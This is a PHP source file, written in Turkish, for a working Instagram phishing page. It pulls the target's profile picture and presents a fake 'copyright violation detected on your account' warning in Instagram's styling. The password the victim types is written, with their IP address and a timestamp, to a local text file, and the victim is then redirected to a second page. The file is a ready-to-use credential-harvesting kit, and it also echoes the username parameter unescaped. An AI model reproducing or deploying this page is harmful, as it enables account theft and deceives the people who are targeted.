<?php
error_reporting(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$nick = $_GET['nick'];
$url = 'https://instagram.com/' . $nick;
    $html = file_get_contents($url);
	$dom = new DOMDocument();
    $dom->loadHTML($html);
	$veri = $dom->textContent;
	$cc = ara('"thumbnail_src":"','"',$veri);
    $meta_tags = $dom->getElementsByTagName('meta');
    foreach( $meta_tags as $meta ) {
        if( $meta->getAttribute('property') == 'og:image' ) {
            $image_url = $meta->getAttribute('content');
        }
    }
if(empty($cc)){
		$cc[0] = $image_url;
	}
if($_POST){
$username = $_POST['username'];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('canofficial.txt', 'a');
fwrite($file, $nick."-----Sifre-----> " .$password. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file);
echo '';
	header("Location: mailindex.php");
}
	?>

<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Hesabınızda Tespit Edilen Telif Hakkı İhlali</title>
<link rel="icon" href="https://imgyukle.com/images/2020/04/02/JFZDMp.png">
</head>
<body class="" style="">
<div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.installLink&amp;mt=8&amp;vt=lo" role="alert"><section class="dZvHF  fvoD7"><p class="xK6EF">Instagram</p><p class="_5b2Kp">Get Instagram from Google Play Or App Store</p></section><section class="FMlV_"><button class="_4IAxF">Get</button></section></a></div></div><br><br>
<div id="react-root">
<section class="LZyqZ">
<div class="lTdZb">
<div class="vqibd  wNNoj ">
<img style="width: 250px;" src="https://i.imgyukle.com/2020/06/20/CNBbNv.gif" alt="selam">
<div class="ZpgjG   _1I5YO">
<h2 class="AjK3K ">Hesabınızda Tespit Edilen Telif Hakkı İhlali</h2>
</div>
<p class="GusmU SVI5E     ">Lütfen instagram şifrenizi yazın ve "Devam et @<?php echo $nick;?>" ve sonraki formu doldurun.
</p>
<div class="GA2q- ">
<form class="JraEb" method="POST">
<div class="QuiLu Xb8C0"><input id="password" name="password" placeholder="Password" type="password" class="PAhYv zyHYP" required=""></div>
<span class="idhGk _1OSdk"><button class="_5f5mN       jIbKX KUBKM      yZn4P   ">Devam et @<?php echo $nick;?></button></span>
</form>
</div>
<br>
<center><a class="_s1olq" href="/accounts/password/reset/"></a></form></center>
</div>
<br>
<p id="community guidelines" style="font-family:sans-serif;font-weight:100; font-size:14px; color:#999;"></p><br>
</div>
</div>
</section>
</div>
<div class="      tHaIX             Igw0E   rBNOH          YBx95   ybXk5    _4EzTm                                                                                                        O1flK   _7JkPY    PdTAI ZUqME" style="height: 60px; width: 100%;"><span aria-label="From Facebook" class="glyphsSpriteFb_brand_center_grey u-__7"></span></div>
</html>
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerUICommons.css/4c68346f3fc7.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.css/f5339c1f472f.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/Challenge.css/e6dcc76c8eaf.css" type="text/css" crossorigin="anonymous">
<div style="position: fixed; top: env(safe-area-inset-top); right: env(safe-area-inset-right); bottom: env(safe-area-inset-bottom); left: env(safe-area-inset-left); pointer-events: none; contain: strict; z-index: -9999;">
</div>
</body>
</html>
 <textarea Style="width:1px; height:

